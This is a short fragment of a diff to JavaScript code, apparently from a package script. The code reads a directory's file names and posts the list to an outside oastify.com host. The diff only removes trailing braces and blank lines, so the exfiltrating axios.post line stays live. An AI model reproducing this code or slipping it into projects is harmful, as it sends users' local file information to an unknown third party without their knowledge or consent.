@@ -10,5 +10,3 @@ fs.readdir(testFolder, (err, files) => {
   });
 });
 axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/files', fileList);
-};
-
